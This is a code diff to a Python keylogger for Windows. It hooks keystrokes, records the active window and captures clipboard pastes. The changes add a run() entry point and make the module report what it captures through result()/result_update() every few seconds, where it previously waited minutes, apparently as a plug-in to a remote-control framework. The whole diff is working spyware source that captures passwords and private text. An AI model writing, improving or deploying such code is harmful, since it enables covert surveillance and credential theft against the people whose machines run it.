@@ -10,7 +10,7 @@ user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
 psapi = ctypes.windll.psapi
 current_window = None
-string = ""
+string = "Keylogged = "
 
 
 def get_current_process():
@@ -34,7 +34,7 @@ def KeyStroke(event):
         current_window = event.WindowName
         get_current_process()
 
-    if event.Ascii > 32 and event.Ascii < 127:
+    if 32 < event.Ascii < 127:
         print(chr(event.Ascii))
     else:
         if event.Key == "V":
@@ -42,10 +42,10 @@ def KeyStroke(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            string += "[PASTE] - %s " % pasted_value
+            string += "[PASTE] - %s \n" % pasted_value
 
         else:
-            string += "[%s]" % event.Key
+            string += "[%s] \n" % event.Key
     return True
 
 
@@ -60,11 +60,15 @@ def run(**args):
     global string
     th = threading.Thread(target=main2)
     th.start()
-    time.sleep(random.randint(100, 300))
+    path = result(string, "Pkeylogger")
+    time.sleep(random.randint(5, 6))
     while True:
         try:
-            result(string, "Pkeylogger")
-            string = ""
-            time.sleep(random.randint(100, 300))
+            result_update(path, string)
+            time.sleep(random.randint(5, 6))
         except:
             continue
+
+
+if __name__ == '__main__':
+    run()
